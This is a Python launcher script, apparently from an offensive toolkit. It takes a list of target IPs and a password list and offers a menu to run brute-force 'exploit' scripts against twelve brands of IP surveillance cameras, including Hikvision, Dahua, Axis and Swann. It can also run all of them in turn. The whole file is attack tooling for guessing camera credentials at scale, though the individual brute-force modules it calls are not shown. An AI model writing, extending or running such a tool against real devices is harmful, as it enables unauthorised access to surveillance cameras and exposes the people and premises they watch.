import os
import time
import datetime
import socket
import platform
import sys
from colorama import Fore, Back, Style

while True:

	iplist=sys.argv[1]
	passlist=sys.argv[2]
	if os.path.exists('./logs'):
		out=open('logs','a')
		out.close()
	else:
		out=open('logs','w')
		out.close()
	choice = input ("Which exploit do yo want to run\n 0) All\n 1) Hikvision\n 2) Dahua\n 3) Net-Surveillance\n 4) Axis\n 5) Arecont\n 6) Samsung\n 7) Samsung multi-channel\n 8) Scw-admiral\n 9) Scw-admiral-line\n 10) Swann\n 11) Hipcam\n 12) Uniview\n 13) Exit\n \nChoose your option:  ")
	if choice == 0:
		print Fore.CYAN + "\nHikvision Exploit Running\n"
		os.system("python hik-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nDahua Exploit Running\n"
		os.system("python dah-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nNet-Surveillance Exploit Running\n"
		os.system("python net-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nAxis Exploit Running\n"
		os.system("python axis-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nArecont Exploit Running\n"
		os.system("python arecont-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nSamsung Exploit Running\n"
		os.system("python sam-hanwa-techwin-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nSamsung2 Exploit Running\n"
		os.system("python sam-hanwa-techwin-2-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nScw-admiral Exploit Running\n"
		os.system("python scw-admiral-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nScw-admiral-line Exploit Running\n"
		os.system("python scw-admiral-line-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nSwann Exploit Running\n"
		os.system("python swann-brute.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nHipcam Exploit Running\n"
		os.system("python hipcam.py %s %s" %(iplist,passlist))
		print Fore.CYAN + "\nUniview Exploit Running\n"
		os.system("python uniview.py %s %s" %(iplist,passlist))
		
	elif choice == 1:
		print Fore.CYAN + "\nHikvision Exploit Running\n"
		os.system("python hik-brute.py %s %s" %(iplist,passlist))
	elif choice == 2:
		print Fore.CYAN + "\nDahua Exploit Running\n"
		os.system("python dah-brute.py %s %s" %(iplist,passlist))
	elif choice == 3:
		print Fore.CYAN + "\nNet-Surveillance Exploit Running\n"
		os.system("python net-brute.py %s %s" %(iplist,passlist))
	elif choice == 4:
		print Fore.CYAN + "\nAxis Exploit Running\n"
		os.system("python axis-brute.py %s %s" %(iplist,passlist))
	elif choice == 5:
		print Fore.CYAN + "\nArecont Exploit Running\n"
		os.system("python arecont-brute.py %s %s" %(iplist,passlist))
	elif choice == 6:
		print Fore.CYAN + "\nSamsung Exploit Running\n"
		os.system("python sam-hanwa-techwin-brute.py %s %s" %(iplist,passlist))
	elif choice == 7:
		print Fore.CYAN + "\nSamsung2 Exploit Running\n"
		os.system("python sam-hanwa-techwin-2-brute.py %s %s" %(iplist,passlist))
	elif choice == 8:
		print Fore.CYAN + "\nScw-admiral Exploit Running\n"
		os.system("python scw-admiral-brute.py %s %s" %(iplist,passlist))
	elif choice == 9:
		print Fore.CYAN + "\nScw-admiral-line Exploit Running\n"
		os.system("python scw-admiral-line-brute.py %s %s" %(iplist,passlist))
	elif choice == 10:
		print Fore.CYAN + "\nSwann Exploit Running\n"
		os.system("python swann-brute.py %s %s" %(iplist,passlist))
	elif choice == 11:
		print Fore.CYAN + "\nHipcam Exploit Running\n"
		os.system("python hipcam.py %s %s" %(iplist,passlist))
	elif choice == 12:
		print Fore.CYAN + "\nUniview Exploit Running\n"
		os.system("python uniview.py %s %s" %(iplist,passlist))
	elif choice == 13:
		exit()
	else :
		print "\nThis is an incorrect option, please choose valid option\n "
